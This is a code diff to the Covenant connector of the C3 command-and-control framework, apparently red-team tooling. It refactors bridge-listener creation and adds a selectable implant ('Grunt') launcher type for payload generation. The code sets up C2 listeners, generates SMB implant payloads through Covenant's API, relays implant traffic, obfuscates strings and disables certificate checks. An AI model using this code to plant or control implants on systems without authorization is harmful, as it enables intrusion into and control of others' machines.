@@ -92,7 +92,7 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// @param jitter percent to jitter the delay by
 		/// @param listenerId the id of the Bridge listener for covenant
 		/// @return generated payload.
-		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string manualExecution, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);
+		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string manualExecution, std::string gruntType, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);
 
 		/// Close desired connection
 		/// @arguments arguments for command. connection Id in string form.
@@ -139,9 +139,11 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// Map of all connections.
 		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
 
+		bool CreateListener();
+
 		bool UpdateListenerId();
 
-		bool UpdateLauncherId();
+		bool UpdateLauncherId(std::string gruntType);
 	};
 }
 
@@ -186,10 +188,73 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateListenerId()
 	return false; //we didn't find the listener
 }
 
-bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateLauncherId()
+bool FSecure::C3::Interfaces::Connectors::Covenant::CreateListener()
+{
+	std::string url;
+	web::http::client::http_client_config config;
+	web::http::http_request request;
+	std::string authHeader;
+	json createBridgeData;
+	json response;
+	pplx::task<web::http::http_response> task;
+	web::http::http_response resp;
+
+	// Listener API URL
+	url = this->m_webHost + OBF("/api/listeners/bridge");
+	authHeader = OBF("Bearer ") + this->m_token;
+
+	//Covenant framework is unlikely to have a valid cert.
+	config.set_validate_certificates(false);
+
+	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
+
+	//If the listener doesn't already exist create it.
+	if (!UpdateListenerId())
+	{
+		//extract ip address from url
+		size_t start = 0, end = 0;
+		start = url.find("://") + 3;
+		end = url.find(":", start + 1);
+
+		if (start == std::string::npos || end == std::string::npos || end > url.size())
+			throw std::exception(OBF("[Covenenat] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));
+
+		this->m_ListeningPostAddress = url.substr(start, end - start);
+
+		///Create the bridge listener
+		request = web::http::http_request(web::http::methods::POST);
+		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
+		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
+
+		// Create request body
+		createBridgeData[OBF("Id")] = 0;
+		createBridgeData[OBF("Name")] = OBF("C3Bridge");
+		createBridgeData[OBF("GUID")] = OBF("b85ea642f2");
+		createBridgeData[OBF("description")] = OBF("A Bridge for custom listeners.");
+		createBridgeData[OBF("bindAddress")] = OBF("0.0.0.0");
+		createBridgeData[OBF("bindPort")] = this->m_ListeningPostPort;
+		createBridgeData[OBF("ConnectAddresses")] = { this->m_ListeningPostAddress };
+		createBridgeData[OBF("ConnectPort")] = this->m_ListeningPostPort;
+		createBridgeData[OBF("ProfileId")] = 3;
+		createBridgeData[OBF("ListenerTypeId")] = 2;
+		createBridgeData[OBF("Status")] = OBF("Active");
+		request.set_body(utility::conversions::to_string_t(createBridgeData.dump()));
+
+		task = webClient.request(request);
+		resp = task.get();
+
+		if (resp.status_code() != web::http::status_codes::OK)
+			throw std::exception((OBF("[Covenant] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
+
+		if (!UpdateListenerId()) //now get the id of the listener
+			throw std::exception((OBF("[Covenant] Error getting ListenerID after creation")));
+	}
+	return true;
+}
+
+bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateLauncherId(std::string gruntType)
 {
 	std::string url = this->m_webHost + OBF("/api/launchers");
-	std::pair<std::string, uint16_t> data;
 	json response;
 
 	web::http::client::http_client_config config;
@@ -215,7 +280,7 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateLauncherId()
 
 	for (auto& launchers : response)
 	{
-		if (launchers[OBF("name")] != OBF("C3SMB"))
+		if (launchers[OBF("name")] != OBF("C3SMB") + gruntType)
 			continue;
 
 		this->m_LauncherId = launchers[OBF("id")].get<int>();
@@ -273,52 +338,11 @@ FSecure::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	else
 		throw std::exception(OBF("[Covenant] Could not get token, invalid logon"));
 
-	//If the listener doesn't already exist create it.
-	if (!UpdateListenerId())
-	{
-		//extract ip address from url
-		size_t start = 0, end = 0;
-		start = url.find("://") + 3;
-		end = url.find(":", start + 1);
-
-		if (start == std::string::npos || end == std::string::npos || end > url.size())
-			throw std::exception(OBF("[Covenenat] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));
-
-		this->m_ListeningPostAddress = url.substr(start, end - start);
-
-		///Create the bridge listener
-		url = this->m_webHost + OBF("/api/listeners/bridge");
-		web::http::client::http_client webClientBridge(utility::conversions::to_string_t(url), config);
-		request = web::http::http_request(web::http::methods::POST);
-		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
-
-		std::string authHeader = OBF("Bearer ") + this->m_token;
-		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
-
-		json createBridgeData;
-		createBridgeData[OBF("Id")] = 0;
-		createBridgeData[OBF("Name")] = OBF("C3Bridge");
-		createBridgeData[OBF("GUID")] = OBF("b85ea642f2");
-		createBridgeData[OBF("description")] = OBF("A Bridge for custom listeners.");
-		createBridgeData[OBF("bindAddress")] = OBF("0.0.0.0");
-		createBridgeData[OBF("bindPort")] = this->m_ListeningPostPort;
-		createBridgeData[OBF("ConnectAddresses")] = { this->m_ListeningPostAddress };
-		createBridgeData[OBF("ConnectPort")] = this->m_ListeningPostPort;
-		createBridgeData[OBF("ProfileId")] = 3;
-		createBridgeData[OBF("ListenerTypeId")] = 2;
-		createBridgeData[OBF("Status")] = OBF("Active");		
-		request.set_body(utility::conversions::to_string_t(createBridgeData.dump()));
-
-		task = webClientBridge.request(request);
-		resp = task.get();
-
-		if (resp.status_code() != web::http::status_codes::OK)
-			throw std::exception((OBF("[Covenant] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
-
-		if(!UpdateListenerId()) //now get the id of the listener
-				throw std::exception((OBF("[Covenant] Error getting ListenerID after creation")));
-
+	// Create bridge listener
+	if (!CreateListener()) {
+		throw std::exception((OBF("[Covenant] Error creating bridge listener")));
 	}
+
 	//Set the listening address to the C2-Bridge on localhost
 	// TODO: Understand why they use static local IP
 	// this->m_ListeningPostAddress = "127.0.0.1";
@@ -361,7 +385,7 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string manualExecution, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string manualExecution, std::string gruntType, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
 {
 	if (binderId.empty() || pipename.empty())
 		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };
@@ -378,7 +402,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 	//std::string binary;
 	FSecure::ByteVector::Super binary;
 
-	
+
 	web::http::client::http_client_config config;
 	config.set_validate_certificates(false);
 
@@ -416,22 +440,24 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 	}
 
 	//The data to create an SMB Grunt
-	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/binary")), config);
+	std::string gruntApi = OBF("/api/launchers/") + gruntType;
+	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + gruntApi), config);
 	// Update Grunt data to current
 	json postData;
 	postData[OBF("listenerId")] = this->m_ListenerId;
 	postData[OBF("implantTemplateId")] = gruntSmbTemplateId;
-	postData[OBF("Name")] = OBF("C3SMB");
+	postData[OBF("Name")] = OBF("C3SMB") + gruntType;
+	postData[OBF("type")] = gruntType;
 	postData[OBF("description")] = OBF("A SMB Launcher for C3Bridge Listener.");
-	postData[OBF("type")] = OBF("Binary");
+
 	postData[OBF("dotNetVersion")] = OBF("Net40");
 	postData[OBF("smbPipeName")] = pipename;
 	postData[OBF("delay")] = delay;
 	postData[OBF("jitterPercent")] = jitter;
 	postData[OBF("connectAttempts")] = connectAttempts;
 	//postData[OBF("outputKind")] = OBF("ConsoleApplication");
-	
-	if (!UpdateLauncherId())
+
+	if (!UpdateLauncherId(gruntType))
 	{
 		///	Create Launcher if it doesn't exists
 
@@ -444,7 +470,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 		if (resp.status_code() != web::http::status_codes::OK)
 			throw std::exception((OBF("[Covenant] Error setting up Launcher, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
 
-		if (!UpdateLauncherId()) //now get the id of the launcher
+		if (!UpdateLauncherId(gruntType)) //now get the id of the launcher
 			throw std::exception((OBF("[Covenant] Error getting LauncherID after creation")));
 	}
 
@@ -488,7 +514,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
 		return payload;
 	}
-	catch(std::exception&)
+	catch (std::exception&)
 	{
 		throw std::exception(OBF("Error generating payload"));
 	}
@@ -595,8 +621,8 @@ FSecure::C3::Interfaces::Connectors::Covenant::Connection::Connection(std::strin
 	if (INVALID_SOCKET == (m_Socket = socket(AF_INET, SOCK_STREAM, 0)))
 		throw FSecure::SocketsException(OBF("Couldn't create socket."), WSAGetLastError());
 
-	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*) & client, sizeof(client)))
-		throw FSecure::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } +OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());
+	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*)&client, sizeof(client)))
+		throw FSecure::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } + OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());
 
 }
 
@@ -620,11 +646,11 @@ void FSecure::C3::Interfaces::Connectors::Covenant::Connection::Send(ByteView da
 
 	//Format the length to match how it is read by Covenant.
 	DWORD length = static_cast<DWORD>(unpacked.size());
-	BYTE* bytes = (BYTE*)& length;
+	BYTE* bytes = (BYTE*)&length;
 	DWORD32 chunkLength = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];
 
 	// Write four bytes indicating the length of the next chunk of data.
-	if (SOCKET_ERROR == send(m_Socket, (char *)&chunkLength, 4, 0))
+	if (SOCKET_ERROR == send(m_Socket, (char*)&chunkLength, 4, 0))
 		throw FSecure::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
 
 	// Write the chunk to socket.
@@ -651,7 +677,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::Connection::R
 		return {};																										//< The connection has been gracefully closed.
 
 	//Format the length to match how it is written by Covenant.
-	BYTE* bytes = (BYTE*)& chunkLength;
+	BYTE* bytes = (BYTE*)&chunkLength;
 	DWORD32 len = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];
 
 	// Read in the result.
@@ -663,8 +689,8 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::Connection::R
 		case 0:
 			return {};																									//< The connection has been gracefully closed.
 
-		case static_cast<DWORD>(SOCKET_ERROR):
-			throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
+			case static_cast<DWORD>(SOCKET_ERROR) :
+				throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
 		}
 
 	return Compression::Compress<Compression::Deflate>(buffer);
@@ -708,10 +734,10 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::Connection::SecondThreadStar
 
 FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
 {
-	auto [manualExecution, pipeName, delay, jitter, connectAttempts] = data.Read<std::string, std::string, uint32_t, uint32_t, uint32_t>();
+	auto [manualExecution, gruntType, pipeName, delay, jitter, connectAttempts] = data.Read<std::string, std::string, std::string, uint32_t, uint32_t, uint32_t>();
 
 
-	return ByteVector{}.Write(manualExecution, pipeName, GeneratePayload(connectionId, manualExecution, pipeName, delay, jitter, connectAttempts), connectAttempts);
+	return ByteVector{}.Write(manualExecution, gruntType, pipeName, GeneratePayload(connectionId, manualExecution, gruntType, pipeName, delay, jitter, connectAttempts), connectAttempts);
 }
 
 
